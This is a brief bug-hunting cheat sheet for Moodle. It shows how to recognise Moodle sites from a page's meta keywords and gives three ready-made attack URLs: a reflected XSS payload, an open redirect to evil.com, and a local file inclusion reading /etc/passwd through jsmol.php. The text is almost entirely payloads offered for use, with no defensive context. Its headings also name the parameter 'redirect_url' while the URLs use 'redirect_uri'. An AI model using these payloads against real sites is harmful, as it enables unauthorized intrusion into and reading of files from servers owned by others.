# Moodle Common Bugs

## Introduction
What would you do if you came across a website that uses Moodle?

## How to Detect
If you visit `https://target.com` and see the source code, you will see `<meta name="keywords" content="moodle,`

1. Reflected XSS in /mod/lti/auth.php via "redirect_url" parameter
```
https://target.com/mod/lti/auth.php?redirect_uri=javascript:alert(1)
```

2. Open redirect in /mod/lti/auth.php in "redirect_url" parameter

```
https://target.com/mod/lti/auth.php?redirect_uri=https://evil.com
```

3. LFI /filter/jmol/js/jsmol/php/jsmol.php in "query" parameter

```
https://target.com/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
```